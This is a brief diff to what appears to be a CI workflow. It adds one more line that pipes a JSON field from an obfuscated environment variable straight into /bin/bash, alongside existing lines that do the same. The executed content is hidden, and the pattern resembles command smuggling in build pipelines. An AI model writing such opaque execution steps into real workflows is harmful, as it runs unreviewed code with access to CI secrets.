@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$asd36762" | jq -r .snu962 | /bin/bash
           echo $wzh77450 | jq -r .eogs7 | /bin/bash
           echo $eku43668 | jq -r .jiidq9 | /bin/bash
+          echo $ainm7 | jq -r .d967 | /bin/bash
 
       - name: Save output
         if: always()
